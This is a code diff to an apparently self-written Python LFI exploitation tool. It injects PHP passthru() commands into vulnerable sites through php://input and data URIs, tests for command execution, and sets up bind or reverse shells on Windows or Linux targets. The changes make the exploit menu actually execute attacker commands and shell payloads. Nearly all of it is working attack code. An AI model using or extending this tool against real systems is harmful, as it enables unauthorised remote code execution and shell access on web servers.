@@ -14,7 +14,7 @@ import re
 # My own logic and own code ;)
 
 class lfi(object):
-	def __init__(self, url=None, cookie=None, command=None, files=None, isShell=None):
+	def __init__(self, url=None, cookie=None, command=None, files=None, isShell=False):
 		self._url = str(url)
 		self._cookie = cookie
 		self._command =  command
@@ -80,21 +80,23 @@ class lfi(object):
 	def test(self):
 		vul = []
 		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
-		self._command = 'echo %s' %rnd
-		if self.phpInput() == ' \r\n%s\r\n'%rnd: vul.append("PHP://input")
-		if self.dataURI() == ' \r\n%s\r\n'%rnd: vul.append("dataURI")
+		self._command = 'echo '+rnd
+		if self.phpInput() == ' \r\n'+rnd+'\r\n': vul.append("PHP://input")
+		if self.dataURI() == ' \r\n'+rnd+'\r\n': vul.append("dataURI")
 		print ('[*] Target is vulnerable to: \n')
 		for i, j in enumerate(vul, start=1): print (i, j)
 		choice = int(input("\n[*] Enter a choice: "))
-		command = str(input("Enter your command: ")) 
-		if choice == 1: pass
-		if choice == 2: pass
-		if choice == 3: pass	
+		if choice == 1:
+			com('phpInput')
+			print (lfiObj.phpInput())
+		if choice == 2:
+			com('dataURI')
+			print (lfiObj.dataURI())
+
 	
 	def phpInput(self):
 		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
-		mydata = ("<?php passthru('echo {0} &" + self._command + "& echo {0}'); ?>").format(rnd) if self._isShell else \
-		("<?php passthru('" + self._command + "'); ?>")
+		mydata = ("<?php passthru('" + self._command + "'); ?>") if self._isShell else ("<?php passthru('echo {0} &" + self._command + "& echo {0}'); ?>").format(rnd)
 		path = self._url + 'php://input'    #the url you want to POST to
 		req = urllib2.Request(path, mydata)
 		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
@@ -265,7 +267,7 @@ class Payload(object):
 def shells(method, shell):
 	shellObj = Payload()
 	shellObj.shell = str(shell) # bind or reverse
-	shellObj.isShell = True
+	lfiObj.isShell = True
 	print('''
 [*] Choose an OS 
 1. Windows
@@ -277,15 +279,15 @@ def shells(method, shell):
 		shellObj.location = str(input("[*] Enter the location to be saved\n(Press enter for the default location): "))
 	if shell == 'reverse':
 		shellObj.ip = str(input("[*] Enter your IP: "))
-		shellObj.port = str(input("[*] Enter listening port: "))
-	else: shellObj.port = str(input("[*] Enter the port to bind: "))
-	#print('[+] Connect on port {0}').format(shellObj.port)
+		shellObj.port = str(input("[*] Enter port to connect: "))
+		print('[+] Listen on port '+str(shellObj.port))
+	else: 
+		shellObj.port = str(input("[*] Enter the port to bind: "))
+		print('[+] Connect on port '+str(shellObj.port))
 	if choice == 1: payload = shellObj.payload_windows()
 	if choice == 2: payload = shellObj.payload_linux_python()
 	lfiObj.command = payload
 		
-
-
 def com(method):
 	if method == 'phpInput':
 		bind = "2. Bind Shell"
